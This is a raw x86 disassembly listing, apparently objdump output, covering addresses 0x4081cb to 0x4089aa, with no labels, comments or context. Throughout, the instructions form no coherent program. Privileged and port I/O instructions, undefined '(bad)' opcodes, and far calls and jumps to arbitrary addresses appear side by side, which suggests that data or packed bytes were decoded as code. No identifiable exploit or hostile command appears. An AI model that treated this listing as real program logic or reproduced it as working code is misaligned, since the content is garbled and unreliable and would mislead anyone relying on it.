  4081cb:	fistp  QWORD PTR [eax-0x9e1983f]
  4081d1:	xchg   ecx,eax
  4081d2:	sbb    edi,DWORD PTR [ecx]
  4081d4:	add    al,0xfb
  4081d6:	icebp  
  4081d7:	shr    DWORD PTR [edi],cl
  4081d9:	loopne 0x408172
  4081db:	outs   dx,DWORD PTR ds:[esi]
  4081dc:	das    
  4081dd:	fwait
  4081de:	push   esi
  4081df:	dec    edx
  4081e0:	pop    edi
  4081e1:	imul   BYTE PTR [ecx-0x4d]
  4081e4:	hlt    
  4081e5:	push   0xb34530c1
  4081ea:	push   edi
  4081eb:	adc    ebx,DWORD PTR [eax+0xe055b3]
  4081f1:	icebp  
  4081f2:	test   DWORD PTR gs:[esi+0xd66b357],esp
  4081f9:	inc    ecx
  4081fa:	hlt    
  4081fb:	mov    esi,0x358c9aa4
  408200:	aad    0x42
  408202:	mov    ebp,0x55f9083d
  408207:	sbb    al,0x60
  408209:	dec    ebx
  40820a:	fmul   DWORD PTR [edx+0x40aa964]
  408210:	and    bl,ch
  408212:	and    bl,ah
  408214:	mov    edi,0x6f9d3e38
  408219:	shr    BYTE PTR [ecx+0x8],1
  40821c:	jns    0x40825d
  40821e:	iret   
  40821f:	mov    ebx,0x15315176
  408224:	or     al,0xca
  408226:	cmp    ebx,edi
  408228:	mov    cl,0xd7
  40822a:	jns    0x4081f7
  40822c:	and    dl,0x2
  40822f:	push   0xcddc6d9e
  408234:	stc    
  408235:	mov    WORD PTR [eax],es
  408237:	push   ecx
  408238:	mov    esp,0x8b0a5d35
  40823d:	sbb    ebp,esi
  40823f:	push   edi
  408240:	xor    edx,0xdd8321f
  408246:	dec    edi
  408247:	test   eax,0xd16cc5cb
  40824c:	jmp    0x479d8615
  408251:	push   eax
  408252:	sbb    dh,bl
  408254:	mov    edi,DWORD PTR [edx]
  408256:	test   DWORD PTR [esi+0x4e],edi
  408259:	cdq    
  40825a:	lahf   
  40825b:	adc    eax,0x1083b7c9
  408260:	xchg   edx,eax
  408261:	jo     0x4082d6
  408263:	mov    bl,0x75
  408265:	xchg   ebx,eax
  408266:	or     al,0x82
  408268:	dec    ebp
  408269:	mov    DWORD PTR [esi+0x3fdda9e],esi
  40826f:	sbb    BYTE PTR cs:[edi+0x0],bh
  408273:	sub    DWORD PTR [esi+0x6a],ecx
  408276:	dec    edi
  408277:	imul   edx,DWORD PTR [edx],0xfffffffe
  40827a:	call   0x22d0491f
  40827f:	inc    eax
  408280:	into   
  408281:	into   
  408282:	in     eax,0x4f
  408284:	outs   dx,DWORD PTR ds:[esi]
  408285:	and    ecx,eax
  408287:	ltr    si
  40828a:	iret   
  40828b:	mov    al,ds:0x244d03ef
  408290:	lahf   
  408291:	fmul   st(1),st
  408293:	leave  
  408294:	outs   dx,DWORD PTR ds:[esi]
  408295:	and    DWORD PTR [eax+0x3ac4f289],esi
  40829b:	bound  eax,QWORD PTR [esi-0x189dcc8b]
  4082a1:	sbb    dh,dl
  4082a3:	lock fstp QWORD PTR [edi+ebp*2]
  4082a7:	adc    al,0xdd
  4082a9:	sub    bh,BYTE PTR [ecx+0x4c053368]
  4082af:	test   ch,0x93
  4082b2:	(bad)  [esi]
  4082b4:	icebp  
  4082b5:	js     0x4082b2
  4082b7:	(bad)  
  4082b8:	sti    
  4082b9:	bts    eax,ebx
  4082bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082bd:	sbb    ch,dh
  4082bf:	push   esi
  4082c0:	mov    DWORD PTR [edi],eax
  4082c2:	repnz idiv ah
  4082c5:	cmp    edx,ebx
  4082c7:	sub    bh,ch
  4082c9:	adc    ebp,DWORD PTR [ebx+edx*4]
  4082cc:	xor    esi,eax
  4082ce:	ret    
  4082cf:	cmp    esi,DWORD PTR [eax+0x53]
  4082d2:	adc    BYTE PTR [ecx],dh
  4082d4:	cmp    dh,dh
  4082d6:	test   al,0x82
  4082d8:	sbb    ecx,DWORD PTR [eax-0x59]
  4082db:	add    BYTE PTR [ecx],ch
  4082dd:	in     al,dx
  4082de:	scas   eax,DWORD PTR es:[edi]
  4082df:	add    DWORD PTR [edi-0x3c],ecx
  4082e2:	mov    eax,0xce907c16
  4082e7:	out    0x3e,al
  4082e9:	mov    ch,0xde
  4082eb:	das    
  4082ec:	(bad)  
  4082ed:	sbb    eax,0xec0beabb
  4082f2:	ror    DWORD PTR [edx-0x7f],cl
  4082f5:	pushf  
  4082f6:	fsub   DWORD PTR [esi]
  4082f8:	daa    
  4082f9:	mov    bh,0xcd
  4082fb:	pop    edx
  4082fc:	adc    ebp,ebp
  4082fe:	mov    ds:0x66e73bb4,eax
  408303:	iret   
  408304:	sar    eax,0x12
  408307:	pop    edx
  408308:	jp     0x408362
  40830a:	xchg   bh,dh
  40830c:	fcmovb st,st(5)
  40830e:	push   ebp
  40830f:	test   eax,0xdc43d73
  408314:	pop    ecx
  408315:	in     eax,dx
  408316:	jns    0x4082fb
  408318:	lock outs dx,BYTE PTR ds:[esi]
  40831a:	in     al,0x28
  40831c:	mov    ah,0xff
  40831e:	push   esi
  40831f:	ret    
  408320:	jl     0x40832d
  408322:	test   eax,0xef4ec616
  408327:	mov    dh,0x1a
  408329:	dec    ebp
  40832a:	xchg   ebp,eax
  40832b:	push   edi
  40832c:	test   BYTE PTR [ebx-0x3a2c3e30],0x20
  408333:	cmp    BYTE PTR [edi-0x56],ch
  408336:	neg    DWORD PTR [edx]
  408338:	push   ebp
  408339:	pop    esi
  40833a:	jge    0x408320
  40833c:	repz cdq 
  40833e:	sub    ch,BYTE PTR [ebx+0x13a81bf5]
  408344:	xor    eax,0xa6642006
  408349:	xchg   esp,eax
  40834a:	inc    esi
  40834b:	mov    al,0xd2
  40834d:	repz popa 
  40834f:	mov    edx,esp
  408351:	outs   dx,BYTE PTR ds:[esi]
  408352:	fwait
  408353:	and    al,0xc8
  408355:	lea    ebx,ds:0xf490e5a
  40835b:	mov    edi,0x4ad87d0d
  408360:	xchg   edi,eax
  408361:	mov    esp,0xd4e676ee
  408366:	mov    bh,0x7e
  408368:	scas   al,BYTE PTR es:[edi]
  408369:	pop    edx
  40836a:	jns    0x40835f
  40836c:	fstp   DWORD PTR [esi+ecx*2-0x7217aabc]
  408373:	mov    edi,DWORD PTR [ebx+0x4378ab45]
  408379:	or     ecx,DWORD PTR [eax]
  40837b:	and    esp,DWORD PTR [eax]
  40837d:	and    BYTE PTR [edi],bh
  40837f:	jne    0x40833e
  408381:	stos   DWORD PTR es:[edi],eax
  408382:	adc    DWORD PTR [esi-0x19],0xb9a726f9
  408389:	cwde   
  40838a:	cmp    eax,0x47c8284c
  40838f:	xchg   edi,eax
  408390:	lahf   
  408391:	cmp    eax,0x67ac9119
  408396:	aaa    
  408397:	adc    dh,cl
  408399:	int    0xec
  40839b:	adc    eax,0x6707f7bb
  4083a0:	sub    ebp,ebx
  4083a2:	pop    esp
  4083a3:	jl     0x40832f
  4083a5:	ja     0x408374
  4083a7:	or     cl,0x9d
  4083aa:	iret   
  4083ab:	adc    esp,ecx
  4083ad:	cdq    
  4083ae:	sub    edi,DWORD PTR [ebp+0x4c557040]
  4083b4:	stos   BYTE PTR es:[edi],al
  4083b5:	sti    
  4083b6:	mov    eax,0xbcbf592a
  4083bb:	dec    ebx
  4083bc:	cmp    DWORD PTR [edx+0x3adc0cb7],esp
  4083c2:	ins    DWORD PTR es:[edi],dx
  4083c3:	je     0x408397
  4083c5:	pushf  
  4083c6:	adc    bh,BYTE PTR [esi+edi*8+0x497f8f82]
  4083cd:	loopne 0x408363
  4083cf:	int3   
  4083d0:	pop    edi
  4083d1:	mov    al,0x49
  4083d3:	out    dx,eax
  4083d4:	in     eax,0xc9
  4083d6:	xchg   esp,eax
  4083d7:	outs   dx,DWORD PTR ds:[esi]
  4083d8:	call   0x4587:0x9500bad9
  4083df:	push   ebx
  4083e0:	jg     0x408401
  4083e2:	xchg   DWORD PTR ds:0x1ac98d8b,ebp
  4083e8:	int    0xa3
  4083ea:	(bad)  
  4083eb:	aaa    
  4083ec:	pop    esi
  4083ed:	fs xchg esi,eax
  4083ef:	mov    esp,0x27654eb9
  4083f4:	xor    edx,esi
  4083f6:	pop    ss
  4083f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083f8:	out    dx,al
  4083f9:	xor    al,0xf5
  4083fb:	mov    ah,0x4f
  4083fd:	xor    al,0xee
  4083ff:	lds    edx,FWORD PTR [edi+0x2795637f]
  408405:	rep outs dx,BYTE PTR ds:[esi]
  408407:	mov    ebx,0xae0b73c3
  40840c:	xchg   ecx,eax
  40840d:	(bad)  
  40840e:	push   edx
  40840f:	cmc    
  408410:	jb     0x408458
  408412:	cld    
  408413:	data16 aam 0x5f
  408416:	sub    cl,BYTE PTR [ecx]
  408418:	jecxz  0x4083c8
  40841a:	adc    BYTE PTR [edx],ch
  40841c:	fdiv   QWORD PTR [edi+ebp*1-0x2e]
  408420:	xchg   DWORD PTR [esi],edi
  408422:	pop    ss
  408423:	xor    bl,BYTE PTR [esi-0x1]
  408426:	out    0xce,al
  408428:	push   eax
  408429:	jo     0x40847c
  40842b:	xchg   esp,eax
  40842c:	(bad)  
  40842d:	push   0x2cdc12b7
  408432:	ja     0x408439
  408434:	sbb    ch,BYTE PTR [ebx-0x3694fea6]
  40843a:	scas   eax,DWORD PTR es:[edi]
  40843b:	fwait
  40843c:	sub    eax,0x7ce98684
  408441:	mov    eax,esp
  408443:	aam    0x8b
  408445:	call   0xbbfe:0xe70dda4
  40844c:	push   edi
  40844d:	jb     0x40841b
  40844f:	mov    eax,0xbfd31b22
  408454:	sub    BYTE PTR [edi+0x17],dh
  408457:	mov    dh,0xcb
  408459:	call   0xadf1fe5f
  40845e:	sahf   
  40845f:	in     al,dx
  408460:	out    0x57,eax
  408462:	push   edi
  408463:	and    al,0x81
  408465:	xor    DWORD PTR [eax+0x336dc71f],0xf1b28505
  40846f:	pop    edx
  408470:	add    DWORD PTR [edx-0x2],edx
  408473:	or     esi,DWORD PTR [edi-0x29c1450e]
  408479:	cmpxchg BYTE PTR [edi-0x153c37d2],bl
  408480:	dec    edx
  408481:	mov    bl,0x3c
  408483:	or     DWORD PTR [ecx+0x4273379a],esp
  408489:	iret   
  40848a:	fisubr DWORD PTR [eax]
  40848c:	xchg   esi,eax
  40848d:	shl    ah,0x1
  408490:	dec    di
  408492:	push   0x4a67b1ba
  408497:	dec    ebx
  408498:	popa   
  408499:	inc    esp
  40849a:	loopne 0x4084a8
  40849c:	sar    BYTE PTR ds:0x3b42888,1
  4084a2:	ja     0x408462
  4084a4:	mov    cl,0xae
  4084a6:	pop    edx
  4084a7:	or     eax,0xd9d28ac0
  4084ac:	(bad)  
  4084ad:	mov    esp,0x678e6256
  4084b2:	xchg   edi,eax
  4084b3:	clc    
  4084b4:	or     eax,DWORD PTR [edi+0x60a67252]
  4084ba:	(bad)  
  4084bb:	sub    al,0x88
  4084bd:	cmp    edi,0xffffffd4
  4084c0:	mov    ah,bl
  4084c2:	push   esp
  4084c3:	loope  0x40851f
  4084c5:	ins    BYTE PTR es:[edi],dx
  4084c6:	dec    di
  4084c8:	mov    ecx,DWORD PTR [eax+0x5c3d60f3]
  4084ce:	sbb    eax,DWORD PTR [ebx-0x28]
  4084d1:	cmp    eax,0x7eff054
  4084d6:	xor    DWORD PTR [eax-0x1d6017fb],esi
  4084dc:	out    dx,eax
  4084dd:	out    0x4,al
  4084df:	test   edi,0x708a183a
  4084e5:	retf   0xc12e
  4084e8:	loopne 0x408555
  4084ea:	dec    edx
  4084eb:	mov    edx,0x3264d237
  4084f0:	pop    edx
  4084f1:	and    esi,eax
  4084f3:	sti    
  4084f4:	repnz inc esp
  4084f6:	jecxz  0x408560
  4084f8:	fcomp  QWORD PTR [ebx+0x387dad39]
  4084fe:	inc    edx
  4084ff:	shr    BYTE PTR [ecx],cl
  408501:	into   
  408502:	inc    ebx
  408503:	pushf  
  408504:	ja     0x408538
  408506:	aaa    
  408507:	cmp    esi,DWORD PTR [edx-0x52a3cb98]
  40850d:	push   esp
  40850e:	push   esi
  40850f:	pop    ebp
  408510:	add    al,0xb2
  408513:	repnz in al,dx
  408515:	mov    cl,BYTE PTR [ebx+0x67]
  408518:	cwde   
  408519:	mov    ebp,0x3e7150e4
  40851e:	test   DWORD PTR [ecx-0x1112fb00],ecx
  408524:	cs inc esi
  408526:	inc    eax
  408527:	sbb    eax,0x8133d27e
  40852c:	mov    ecx,0x2b5c74dd
  408531:	icebp  
  408532:	inc    ebp
  408533:	sbb    edx,DWORD PTR ds:0x3ba5e712
  408539:	ficomp DWORD PTR [ebp+ebx*2-0x7dc34a84]
  408540:	mov    dl,0x7e
  408542:	(bad)  
  408543:	pop    ss
  408544:	sti    
  408545:	inc    di
  408547:	xchg   ebx,eax
  408548:	shl    BYTE PTR [edi],1
  40854a:	and    DWORD PTR [edx+0x70],ecx
  40854d:	xchg   ecx,eax
  40854e:	push   ebp
  40854f:	pop    esp
  408550:	loopne 0x4084ff
  408552:	repnz cdq 
  408554:	add    eax,0x6a7898bc
  408559:	fisttp DWORD PTR [ecx]
  40855b:	jne    0x40856c
  40855d:	jecxz  0x408501
  40855f:	xchg   edx,eax
  408560:	push   ebx
  408561:	add    eax,0x13b621b8
  408566:	push   0x321493e9
  40856b:	sahf   
  40856c:	dec    esi
  40856d:	mov    ebp,0x84968338
  408572:	(bad)  ds:0x7c2f50a1
  408578:	ud1    esp,DWORD PTR [ecx+ebp*1]
  40857c:	inc    eax
  40857d:	loop   0x40855a
  40857f:	xchg   BYTE PTR [esi],ah
  408581:	cmp    BYTE PTR [edi-0x5453365],ch
  408587:	and    al,0x13
  408589:	test   BYTE PTR [ebp-0x1a],cl
  40858c:	cwde   
  40858d:	aas    
  40858e:	xchg   DWORD PTR [edi-0x5],esi
  408591:	mov    eax,ds:0x2d98481c
  408596:	out    0xf7,eax
  408598:	xchg   esp,eax
  408599:	ficom  WORD PTR [edi]
  40859b:	mov    esi,DWORD PTR [eax-0x14]
  40859e:	inc    eax
  40859f:	jae    0x408564
  4085a1:	jge    0x4085c4
  4085a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085a4:	xor    ebp,DWORD PTR [ecx-0x43323066]
  4085aa:	shl    BYTE PTR [ecx+eax*1],0xe
  4085ae:	(bad)  
  4085b0:	idiv   dh
  4085b2:	icebp  
  4085b3:	popf   
  4085b4:	popf   
  4085b5:	inc    edx
  4085b6:	push   cs
  4085b7:	dec    esp
  4085b8:	inc    edi
  4085b9:	test   al,0xaa
  4085bb:	repnz dec edi
  4085bd:	mov    esi,0xe2627df7
  4085c2:	lahf   
  4085c3:	lock ds sub sp,ax
  4085c8:	in     al,dx
  4085c9:	dec    edx
  4085ca:	scas   eax,DWORD PTR es:[edi]
  4085cb:	inc    eax
  4085cc:	xchg   edi,eax
  4085cd:	jmp    0x38a:0xf9f09788
  4085d4:	in     eax,dx
  4085d5:	mov    cl,0x16
  4085d7:	push   ds
  4085d8:	ja     0x408608
  4085da:	in     eax,dx
  4085db:	and    DWORD PTR [ebx-0x37e673d5],ebx
  4085e1:	push   eax
  4085e2:	(bad)  [eax+0x52]
  4085e5:	clc    
  4085e6:	cmc    
  4085e7:	cmp    DWORD PTR [ebx+0x66],ebp
  4085ea:	and    DWORD PTR [edi],ebp
  4085ec:	imul   DWORD PTR [eax+0x66]
  4085ef:	sub    DWORD PTR [ebx-0x41],ebp
  4085f2:	and    ebx,esi
  4085f4:	in     eax,0x8a
  4085f6:	add    dl,BYTE PTR [ebp+0x52]
  4085f9:	mov    DWORD PTR [edi-0x6d],esi
  4085fc:	mov    dl,0x46
  4085fe:	sti    
  4085ff:	nop
  408600:	aad    0x11
  408602:	cmp    al,0xbc
  408604:	iret   
  408605:	jae    0x408632
  408607:	xor    ebx,ebx
  408609:	jns    0x408662
  40860b:	xchg   al,cl
  40860d:	shl    BYTE PTR [ebx],0x97
  408610:	cmp    eax,0xf16da9c3
  408615:	and    BYTE PTR ds:0x37b53967,ch
  40861b:	rol    ah,cl
  40861d:	mov    esp,0xd9ae6ba8
  408622:	adc    DWORD PTR [ebx+0x31],ecx
  408625:	or     eax,0x471a5f31
  40862a:	arpl   WORD PTR [ecx+0x4e8035f],bp
  408630:	lods   eax,DWORD PTR ds:[esi]
  408631:	mov    ch,0x11
  408633:	(bad)
  408636:	fmul   DWORD PTR [ecx*1+0x56195687]
  40863d:	iret   
  40863e:	xor    al,0x61
  408640:	ds push 0x99461125
  408646:	mov    DWORD PTR [esi-0x2cbc0072],esp
  40864c:	xchg   ebx,eax
  40864d:	mov    WORD PTR [esp+ebp*4-0x63],?
  408651:	in     al,0x5c
  408653:	mov    ebp,0xae91b452
  408658:	test   ch,dl
  40865a:	jo     0x408624
  40865c:	and    bh,al
  40865e:	daa    
  40865f:	lock adc BYTE PTR [eax-0x7e009330],dl
  408666:	das    
  408667:	push   es
  408668:	inc    ecx
  408669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866a:	cmc    
  40866b:	das    
  40866c:	pop    eax
  40866d:	dec    esi
  40866e:	int    0x22
  408670:	jmp    DWORD PTR [edi-0xe]
  408673:	cmp    BYTE PTR [esi+ebx*4+0x36],bh
  408677:	nop
  408678:	rcr    DWORD PTR [esi-0xe1432ba],cl
  40867e:	jmp    0x40863f
  408680:	fldlg2 
  408682:	leave  
  408683:	mov    al,ds:0x2dd6ba2
  408688:	or     eax,0x2b3e6500
  40868d:	pop    edi
  40868e:	outs   dx,DWORD PTR ds:[esi]
  40868f:	pop    ebp
  408690:	outs   dx,BYTE PTR ds:[esi]
  408691:	sbb    DWORD PTR [esi-0x37fd1d17],ecx
  408697:	out    dx,al
  408698:	stc    
  408699:	ficom  WORD PTR [esi]
  40869b:	mov    eax,ds:0x4c9a8cd6
  4086a0:	mul    DWORD PTR [bx+0x1d8f]
  4086a5:	sahf   
  4086a6:	cld    
  4086a7:	mov    eax,ds:0x7111f74b
  4086ac:	xchg   edi,eax
  4086ad:	test   dl,dh
  4086af:	xchg   edi,eax
  4086b0:	into   
  4086b1:	jle    0x40869a
  4086b3:	push   edx
  4086b4:	int3   
  4086b5:	test   dl,ch
  4086b7:	jmp    0xb82cfa22
  4086bc:	popf   
  4086bd:	adc    bl,ah
  4086bf:	jae    0x408715
  4086c1:	mov    esi,0xae72fc3
  4086c6:	jbe    0x40869e
  4086c8:	jnp    0x408736
  4086ca:	(bad)  
  4086cc:	cwde   
  4086cd:	jo     0x4086cb
  4086cf:	push   edx
  4086d0:	js     0x4086af
  4086d2:	push   ds
  4086d3:	iret   
  4086d4:	stos   DWORD PTR es:[edi],eax
  4086d5:	fnstsw WORD PTR [edx]
  4086d7:	sub    ebp,DWORD PTR [edx+ebx*1-0x31]
  4086db:	lods   al,BYTE PTR ds:[esi]
  4086dc:	pop    edx
  4086dd:	(bad)  
  4086de:	and    eax,0x7b7c0cf6
  4086e3:	xor    dl,BYTE PTR [eax+0x1b51038d]
  4086e9:	mov    ds:0x917b98f8,al
  4086ee:	push   eax
  4086ef:	jbe    0x4086f6
  4086f1:	xchg   esi,eax
  4086f2:	dec    edi
  4086f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086f4:	icebp  
  4086f5:	out    0xbd,eax
  4086f7:	sub    eax,0xa4af64a9
  4086fc:	adc    BYTE PTR [edi+edi*4],bl
  4086ff:	add    al,al
  408701:	jne    0x4086df
  408703:	(bad)  
  408704:	(bad)  
  408705:	lock sar DWORD PTR [eax+0x3682e304],0x81
  40870d:	rcr    DWORD PTR [edi+ebp*8],cl
  408710:	and    eax,0xc9823ad5
  408715:	in     eax,dx
  408716:	rcr    cl,0x45
  408719:	clc    
  40871a:	stos   DWORD PTR es:[edi],eax
  40871b:	mov    DWORD PTR [edi-0x15],esi
  40871e:	leave  
  40871f:	xchg   ecx,eax
  408720:	outs   dx,BYTE PTR ds:[esi]
  408721:	push   edx
  408722:	aad    0x80
  408724:	mov    DWORD PTR [esi+ecx*4+0x4cd0cee8],eax
  40872b:	pop    ss
  40872c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872d:	iret   
  40872e:	test   BYTE PTR [esi+0x77727471],al
  408734:	dec    ebx
  408735:	xchg   ebp,eax
  408736:	or     bh,bl
  408738:	retf   
  408739:	sar    DWORD PTR [esi],1
  40873b:	inc    edx
  40873c:	hlt    
  40873d:	in     eax,dx
  40873e:	dec    ebx
  40873f:	and    al,0x34
  408741:	push   eax
  408742:	pop    esi
  408743:	and    eax,esi
  408745:	pop    ebx
  408746:	xchg   esi,eax
  408747:	jns    0x4086dd
  408749:	out    0x36,al
  40874b:	mov    al,ds:0x91f978a
  408750:	sahf   
  408751:	push   esi
  408752:	outs   dx,BYTE PTR ds:[esi]
  408753:	jnp    0x40872b
  408755:	(bad)  
  408757:	add    DWORD PTR [edx+0x173bd5ed],esi
  40875d:	xchg   edx,eax
  40875e:	sbb    al,0xf5
  408760:	outs   dx,BYTE PTR ds:[esi]
  408761:	aas    
  408762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408763:	test   DWORD PTR [edi],eax
  408765:	mov    edx,0x29d19845
  40876a:	mov    eax,0x6c3b7bd
  40876f:	fnstcw WORD PTR [eax+0x54]
  408772:	stc    
  408773:	and    ah,ch
  408775:	mov    al,0x2c
  408777:	mov    ebx,0xa0ce0c8f
  40877c:	aam    0xf1
  40877e:	jo     0x408702
  408780:	inc    esi
  408781:	or     al,ah
  408783:	xor    eax,0x767b2ae0
  408788:	pop    ds
  408789:	dec    ebx
  40878a:	mov    bh,0xa2
  40878c:	stos   DWORD PTR es:[edi],eax
  40878d:	ja     0x408775
  40878f:	adc    DWORD PTR [esp+eax*2],ebp
  408792:	push   ss
  408793:	hlt    
  408794:	adc    eax,0x4f2b300b
  408799:	jp     0x4087c1
  40879b:	sbb    al,0x8b
  40879d:	mov    esi,0xa2b300e5
  4087a2:	rcr    BYTE PTR [esi+edx*2+0x16],1
  4087a6:	div    DWORD PTR [esi+0x5d]
  4087a9:	xor    cl,ah
  4087ab:	sub    edi,DWORD PTR [edx+0x6fa74bb7]
  4087b1:	adc    eax,0xa09b03e3
  4087b6:	or     BYTE PTR [eax-0x327b8a9a],ah
  4087bc:	jp     0x408793
  4087be:	xor    eax,0xfe88d3ac
  4087c3:	pop    edx
  4087c4:	sub    ebp,DWORD PTR [ecx-0xc4cf262]
  4087ca:	adc    eax,0x1d137769
  4087cf:	loope  0x40882b
  4087d1:	gs pop edi
  4087d3:	pusha  
  4087d4:	pop    ebp
  4087d5:	jp     0x4087ca
  4087d7:	or     eax,0x4ff9847f
  4087dc:	aaa    
  4087dd:	ins    DWORD PTR es:[edi],dx
  4087de:	daa    
  4087df:	jp     0x408843
  4087e1:	sbb    BYTE PTR [ecx],ch
  4087e3:	or     al,0x42
  4087e5:	inc    ebx
  4087e6:	xor    al,0xa9
  4087e8:	cmp    edi,DWORD PTR [eax+0x30]
  4087eb:	sub    ebx,DWORD PTR [ebx-0x79]
  4087ee:	cmp    ah,BYTE PTR [edi]
  4087f0:	lods   eax,DWORD PTR ds:[esi]
  4087f1:	shl    BYTE PTR [eax+0x545f313c],cl
  4087f7:	xchg   BYTE PTR [eax+0x60],ch
  4087fa:	xor    BYTE PTR [edi+ebx*2+0x24edea83],ah
  408801:	repz pop eax
  408803:	imul   edi,DWORD PTR [eax-0x6a],0xffffffbd
  408807:	push   esp
  408808:	pop    ss
  408809:	cs inc ecx
  40880b:	std    
  40880c:	loopne 0x408819
  40880e:	cmp    eax,0x4694b934
  408813:	sub    bl,al
  408815:	and    ch,BYTE PTR [ebx+0x2d29c3b]
  40881b:	fcom   DWORD PTR [edx+0x4a]
  40881e:	xchg   edx,eax
  40881f:	or     BYTE PTR [esi+ecx*1+0x63],cl
  408823:	(bad)  
  408824:	push   0xffffffdf
  408826:	dec    esp
  408827:	jp     0x408838
  408829:	cmc    
  40882a:	mov    ds:0x7f164aee,eax
  40882f:	cli    
  408830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408831:	mov    ebx,0xd0a47e79
  408836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408837:	sbb    BYTE PTR [eax-0x4c],dh
  40883a:	inc    ebp
  40883b:	js     0x408858
  40883d:	cmp    ebp,DWORD PTR [esi-0x45]
  408840:	push   ebx
  408841:	pop    ss
  408842:	adc    al,0xf5
  408844:	add    BYTE PTR [edi],bl
  408846:	imul   eax,edx,0x36
  408849:	in     eax,0x6a
  40884b:	bound  ebx,QWORD PTR [edx-0x69]
  40884e:	lods   al,BYTE PTR ds:[esi]
  40884f:	das    
  408850:	sahf   
  408851:	pusha  
  408852:	es mov ah,0x55
  408855:	ins    DWORD PTR es:[edi],dx
  408856:	test   al,0xc5
  408858:	leave  
  408859:	push   ebx
  40885a:	stos   BYTE PTR es:[edi],al
  40885b:	mov    bl,0x13
  40885d:	cwde   
  40885e:	push   esp
  40885f:	in     al,0x1e
  408861:	retf   0xaa63
  408864:	sub    DWORD PTR [esi+eax*8+0x2e1c9e23],0x13
  40886c:	fwait
  40886d:	gs xor edi,edx
  408870:	fild   QWORD PTR [ecx+0x4cc568b2]
  408876:	ss mov ebp,0x42ac6206
  40887c:	xor    bh,BYTE PTR [esi+0x50]
  40887f:	in     eax,0x2f
  408881:	jmp    0x41d6952e
  408886:	jno    0x408839
  408888:	or     ebp,DWORD PTR [esp+edi*4]
  40888b:	pop    eax
  40888c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40888d:	and    al,BYTE PTR ds:0xb4894b54
  408893:	les    ebx,FWORD PTR [esp+esi*4+0x3a9de39b]
  40889a:	dec    eax
  40889b:	dec    ecx
  40889c:	add    edx,esp
  40889e:	sti    
  40889f:	inc    esi
  4088a0:	stos   DWORD PTR es:[edi],eax
  4088a1:	fisubr DWORD PTR [ebx-0x60]
  4088a4:	sub    al,0xfc
  4088a6:	mov    esp,0x437401cd
  4088ab:	(bad)  
  4088ad:	sbb    esp,eax
  4088af:	(bad)  
  4088b0:	pop    ds
  4088b1:	cmp    bh,BYTE PTR [esi+0x6f54f40e]
  4088b7:	sub    al,0xde
  4088b9:	fcmove st,st(1)
  4088bb:	js     0x4088bf
  4088bd:	dec    eax
  4088be:	cwde   
  4088bf:	clc    
  4088c0:	sub    DWORD PTR [ebx+0x4c],esp
  4088c3:	adc    BYTE PTR [ecx-0x9],dl
  4088c6:	jnp    0x4088fc
  4088c8:	add    edx,DWORD PTR [edx-0x7d]
  4088cb:	retf   
  4088cc:	inc    edi
  4088cd:	imul   ebp,DWORD PTR [esi+0x7c29977e],0x4286bff8
  4088d7:	mov    al,ds:0xead1aec8
  4088dc:	out    0x37,al
  4088de:	jno    0x408922
  4088e0:	arpl   WORD PTR [esi-0x3926bb6],bp
  4088e6:	int    0x5
  4088e8:	mov    dl,0xe7
  4088ea:	cs addr16 or al,ah
  4088ee:	dec    ebx
  4088ef:	pop    ebx
  4088f0:	fcmovnu st,st(2)
  4088f2:	pop    eax
  4088f3:	mov    eax,0xf5de9214
  4088f8:	ins    BYTE PTR es:[edi],dx
  4088f9:	leave  
  4088fa:	stos   DWORD PTR es:[edi],eax
  4088fb:	pop    ds
  4088fc:	push   ebx
  4088fd:	ins    BYTE PTR es:[edi],dx
  4088fe:	pop    ecx
  4088ff:	bound  esp,QWORD PTR [edx]
  408901:	adc    DWORD PTR [ebx],ebp
  408903:	adc    bl,dl
  408905:	loope  0x408944
  408907:	adc    DWORD PTR [esi-0x68],0xfffffffa
  40890b:	in     eax,dx
  40890c:	add    edx,0x206941c
  408912:	mov    eax,0xca109a55
  408917:	ja     0x40894d
  408919:	xchg   esp,eax
  40891a:	daa    
  40891b:	mov    eax,ds:0xb8f6e99
  408920:	call   0x90b005ea
  408925:	inc    ecx
  408926:	fincstp 
  408928:	inc    ax
  40892a:	out    dx,eax
  40892b:	cmp    eax,0x56e00017
  408930:	cmp    al,0xec
  408932:	outs   dx,BYTE PTR ds:[esi]
  408933:	xor    DWORD PTR [esi],eax
  408935:	pop    ds
  408936:	adc    eax,0x9df9cccb
  40893b:	sbb    DWORD PTR [ebx],ebx
  40893d:	mov    ah,0x1a
  40893f:	or     DWORD PTR ds:0x4597e188,eax
  408945:	(bad)  
  408946:	mov    edi,0x26013e80
  40894b:	xchg   DWORD PTR [eax-0x63],esp
  40894e:	pop    edi
  40894f:	imul   BYTE PTR [eax+0x69]
  408952:	in     al,0x90
  408954:	sub    cl,BYTE PTR [ebx-0x58b3a46f]
  40895a:	cmp    ebx,DWORD PTR [esi]
  40895c:	add    BYTE PTR [esi+0x57e8bcf5],dl
  408962:	in     eax,0x1c
  408964:	in     eax,0xc2
  408966:	stc    
  408967:	mov    dl,0xd3
  408969:	mov    dh,dl
  40896b:	mov    eax,ds:0xab9100df
  408970:	lock cwde 
  408972:	nop
  408973:	cmp    al,0x3b
  408975:	mov    dh,0x8
  408977:	ins    BYTE PTR es:[edi],dx
  408978:	iret   
  408979:	(bad)
  40897c:	idiv   esi
  40897e:	push   edx
  40897f:	lock inc ebp
  408981:	icebp  
  408982:	pop    edi
  408983:	push   cs
  408984:	loop   0x40893d
  408986:	mov    edi,0x93882195
  40898b:	pop    edx
  40898c:	mov    ecx,cs
  40898e:	fwait
  40898f:	pop    ss
  408990:	jne    0x4089be
  408992:	mov    ds:0xa7e0e219,eax
  408997:	cld    
  408998:	popa   
  408999:	clc    
  40899a:	shl    ebp,0xbb
  40899d:	rcl    BYTE PTR [eax+edi*2],cl
  4089a0:	out    0xd4,eax
  4089a2:	add    BYTE PTR [ecx+0x1a],dh
  4089a5:	and    eax,0xc23b6d78
  4089aa:	or     al,0x40
